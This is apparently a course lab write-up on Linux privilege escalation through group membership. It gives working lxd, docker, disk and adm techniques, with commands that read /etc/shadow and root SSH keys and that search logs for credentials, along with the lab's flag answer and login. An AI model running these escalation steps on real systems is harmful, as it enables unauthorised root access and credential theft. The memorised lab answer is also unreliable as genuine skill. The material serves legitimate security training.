# Section 10 — Privileged Groups

> Lab: `ACADEMY-LPE-NIX02` · `ssh secaudit@<T>` (`Academy_LLPE!`)

## ✅ Answer (verified live)

| Q | Answer |
|---|--------|
| Q1 — flag via secaudit's privileged group | **`ch3ck_th0se_gr0uP_m3mb3erSh1Ps!`** |

`secaudit` ∈ **`adm`** group → can read `/var/log/apache2/`. The flag was logged as a URL request:
`GET /flag%20=%20ch3ck_th0se_gr0uP_m3mb3erSh1Ps!` (`%20=%20` → ` = `).

---

## Step 0 — Check group membership first

```bash
id ; groups
getent group lxd docker disk adm sudo video shadow 2>/dev/null
```
> Privileged groups that = (near) root: **`lxd`/`lxc`, `docker`, `disk`, `adm`, `shadow`, `sudo`, `video`, `kvm`, `wheel`**. Identify which one(s) your user is in, then use the matching technique below.

---

## adm — read all of /var/log (this box)

```bash
grep -rsiE 'flag|password|passwd|pwd|secret|key' /var/log 2>/dev/null | grep -vi binary | head
grep -ri 'flag' /var/log/apache2/ 2>/dev/null            # <- flag was here (access.log)
find /var/log -name '*.gz' -exec zgrep -iE 'flag|pass' {} \; 2>/dev/null
```
> `adm` doesn't grant root directly — it grants **read of every log**: web access/error logs (creds & flags in URLs/params, like here), `auth.log` (typed passwords, sudo usage), `mysql/`, app logs. URL-decode findings (`%20`→space, `%3D`→`=`). Classic disclosure → lateral/priv escalation via recovered creds.

---

## lxd / lxc — container mount → root FS

```bash
# (image transferred to the box, e.g. alpine.tar.gz)
lxd init                                   # accept defaults (bridge error is fine)
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
lxc init alpine r00t -c security.privileged=true
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
lxc start r00t
lxc exec r00t /bin/sh
# inside container (uid=0):
cat /mnt/root/etc/shadow ; cp /mnt/root/etc/sudoers ... ; cat /mnt/root/root/.ssh/id_rsa
```
> `security.privileged=true` = no UID mapping → container root == host root. Mounting host `/` at `/mnt/root` gives full host read/write as root → grab `/etc/shadow`, root SSH key, or add a sudoers entry. (Build a tiny Alpine image with `distrobuilder` if none is present.)

---

## docker — group = root FS

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh        # full host as root
docker run -v /root:/mnt -it ubuntu                        # just root's home
# no images? : docker run -v /:/mnt --rm -it $(docker images -q | head -1) chroot /mnt sh
```
> Membership of `docker` ≈ passwordless root: mount host `/` into a container, `chroot`, done. Read `/etc/shadow`, add SSH key to `/root/.ssh/authorized_keys`, or add a sudoers line.

---

## disk — debugfs raw FS access

```bash
df -h /                       # find the root device, e.g. /dev/sda1
debugfs /dev/sda1
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
debugfs: rdump /root /tmp/loot
```
> `disk` group → full read (often write) of the block device backing `/` via `debugfs` — bypasses file permissions entirely. Pull SSH keys / shadow, or write to escalate.

---

## Exam / Engagement Notes

- **`id` first** → map your group(s) to the technique: `adm`=logs, `lxd/docker/disk`=root FS, `shadow`=read `/etc/shadow`, `video`=framebuffer screen-grab.
- **adm**: `grep -rsi 'flag\|pass' /var/log` (esp. `apache2/access.log` & `auth.log`); **URL-decode** results (`%20`/`%3D`/`%21`). This box's flag was a logged GET request.
- **lxd/docker/disk** are effectively instant root — mount/chroot host `/`, then shadow-crack / SSH-key / sudoers.
- Even non-root groups (adm, shadow) → cred disclosure → reuse → root.
- Report note: don't add interactive users to `lxd/docker/disk`; treat as root-equivalent.

---

## Lab Walkthrough (quick steps)

```
1. ssh secaudit@<T>  (Academy_LLPE!)
2. id  -> groups=...,4(adm)
3. grep -ri flag /var/log/apache2/ 2>/dev/null
   -> GET /flag%20=%20ch3ck_th0se_gr0uP_m3mb3erSh1Ps!
4. URL-decode -> flag = ch3ck_th0se_gr0uP_m3mb3erSh1Ps!   ✅
```

> One line: `id` → `adm` → `grep -ri flag /var/log` → the answer was sitting in the Apache access log (URL-decode it).
